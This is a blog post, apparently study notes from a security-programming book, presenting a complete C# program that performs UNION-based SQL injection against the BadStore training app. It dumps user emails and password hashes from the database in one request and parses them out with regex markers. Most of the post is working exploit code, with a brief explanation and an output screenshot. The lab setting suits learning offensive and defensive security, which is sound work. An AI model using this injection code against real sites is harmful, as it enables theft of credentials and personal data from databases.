---
title: Creating a UNION based mutational fuzzer to dump the database.
date: 2021-06-12 10:45:47 +07:00
categories: greyhatcch2
#modified: 20-08-29 09:24:47 +07:00
#tags: [blog, netlify, jekyll, github]
description: Creating a UNION based mutational fuzzer to dump the database.
---

## This Program is a UNION-Based mutational fuzzer that will use UNION based queries to pull out the db in a single http request.

_UNION injection is faster than boolean based/blind injection_.
- 2 major aspects are required for a succesfull UNION injection - Balance out the number of columns using SELECT statements and programatically find the data using regex.
- We use the:
  > `SELECT function` to balance out columns.
  
  > `CONCAT function` to surround the data with padding we care about.
- We use the "Regex" class and the `MatchCollection` class using the `System.Text.RegularExpressions` namespace to find and match the surrounding padded data from the `CONCAT() function` and extract the data in between.

### Code Block:

```Csharp
using System;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.IO;
using System.Text.RegularExpressions;
using System.Web;


namespace Union_sql_fuzzer
{
    class Program
    {
        static void Main(string[] args)
        {
            string frontMarker = "FrOnTmArKeR";
            string middleMarker = "MiDdLeMaRkEr";
            string endMarker = "EnDmArKeR";

            string frontHex = string.Join("", frontMarker.Select(c => ((int)c).ToString("X2")));
            string middleHex = string.Join("", middleMarker.Select(c => ((int)c).ToString("X2")));
            string endHex = string.Join("", endMarker.Select(c => ((int)c).ToString("X2")));

            string url = "http://" + args[0] + "/cgi-bin/badstore.cgi";
            //payload definition slightly changed from source
            string payload = "fdsa' UNION ALL SELECT";
            payload += " NULL, NULL, NULL, CONCAT(0x" + frontHex + ", IFNULL(CAST(email AS";
            payload += " CHAR), NULL), 0x" + middleHex + ", IFNULL(CAST(passwd AS";
            payload += " CHAR), NULL), 0x" + endHex + ") FROM badstoredb.userdb# ";
            //HttpUtilty method used instead of Uri.EscapeUriString() method
            url += "?searchquery=" + HttpUtility.UrlEncode(payload) + "&action=search";
            Console.WriteLine("Fuzzing for union sql injections on url: \n" + url);

            //Making the Web request
            HttpWebRequest request = (HttpWebRequest)WebRequest.Create(url);
            string response = string.Empty;
            using (StreamReader reader = new StreamReader(request.GetResponse().GetResponseStream()))
                response = reader.ReadToEnd();

            //Regex definition
            Regex payloadRegex = new Regex(frontMarker + "(.*?)" + middleMarker + "(.*?)" + endMarker);
            MatchCollection matches = payloadRegex.Matches(response);
            foreach (Match match in matches)
            {
                Console.WriteLine("\r\n[+] Username found is: " + match.Groups[1].Value + "\t");
                Console.Write("[+] Password Hash found is: " + match.Groups[2].Value + "\n");
            }
        }
    }
}

```

### Output:

![Image](https://raw.githubusercontent.com/m3rcer/m3rcer.github.io/master/_posts/coding/csharp/greyhatc/Ch2/UNION_sql_fuzzer/union_sql_fuzzer.png)
